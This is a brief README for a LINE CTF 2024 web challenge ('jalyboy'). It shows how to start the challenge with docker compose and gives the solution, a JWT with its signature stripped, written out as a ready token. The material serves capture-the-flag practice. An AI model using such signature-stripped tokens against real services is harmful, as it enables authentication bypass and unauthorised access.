# linectf2024-jalyboy

## How to run it

```shell
docker compose up -d
```

Access http://localhost:10000/

## Solution
Send a jwt without signature like this `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`
